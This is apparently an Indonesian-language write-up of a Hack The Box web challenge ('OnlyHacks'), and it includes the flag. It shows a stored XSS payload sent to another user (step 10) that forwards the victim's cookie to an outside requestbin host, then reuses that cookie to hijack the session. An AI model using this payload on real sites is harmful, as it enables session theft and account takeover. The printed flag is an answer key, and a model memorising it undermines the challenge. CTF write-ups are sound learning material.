HTB{d0nt_trust_str4ng3r5_bl1ndly}

requirement: web enumeration knowledge, web structure
gain: XSS knowledge

1. masuk ke onlyhack setelah kalian nyalakan mesinnya
2. Register terlebih dahulu agar bisa login ke webnya
3. setelah itu kalian klik love semuanya dan klik menuju ke massage
4. kalian coba kirim pesan ke renata karena dia selalu online dari deskripsinya
5. setelah itu cobalah kirim <script>alert('XSS')</script
6. Jika berhasil, maka vurnerable yang didapatkan adalah XSS 
7. karena di deskripsi dari judul challenge ini adalah mencari sesuatu yang memungkinkan untuk dicuri, kita bisa asumsikan kalau yang dicuri ini adalah cookie dari lawan.
8. Kita bisa mengambil cookie dengan cara pergi ke website https://requestbin.whapi.cloud setelah itu create request
9. copy link address dari http requestbin tersebut dan kita balik ke onlyhacks tadi
10. pergi ke pesan renata lagi dan isi pesan dengan <script>document.location='http://requestbinkalian:port/randomnumber?cookie='+document.cookie</script>
11. setelah itu enter dan kalian balik ke web requestbin dan akan terdapat 2 get, tetapi ambillah cookie yang tidak sesuai sama cookie kalian (kalian bisa mengecek cookie kalian dengan inspect lalu ke storage)
12. sesudah itu ke onlyhacks lagi dan kalian ganti (replace dengan ctrl+v) cookie kalian dengan cookie yang baru saja kalian copy sesudah itu paste lalu refresh.


